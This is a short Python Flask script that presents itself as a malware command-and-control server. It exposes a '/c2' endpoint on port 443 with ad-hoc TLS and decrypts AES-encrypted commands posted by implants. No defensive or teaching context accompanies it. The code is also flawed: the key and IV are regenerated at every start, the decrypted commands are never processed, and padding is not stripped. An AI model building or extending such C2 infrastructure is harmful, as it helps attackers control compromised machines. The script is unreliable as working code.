from flask import Flask, request  
from Crypto.Cipher import AES  
import base64, os  

app = Flask(__name__)  

# AES-256 Configuration  
key = os.urandom(32)  
iv = os.urandom(16)  

def decrypt(data):  
    cipher = AES.new(key, AES.MODE_CBC, iv)  
    return cipher.decrypt(base64.b64decode(data)).strip()  

@app.route('/c2', methods=['POST'])  
def command_center():  
    encrypted_data = request.json.get('data')  
    decrypted = decrypt(encrypted_data)  
    # Process decrypted commands  
    return "ACK"  

if __name__ == '__main__':  
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')  
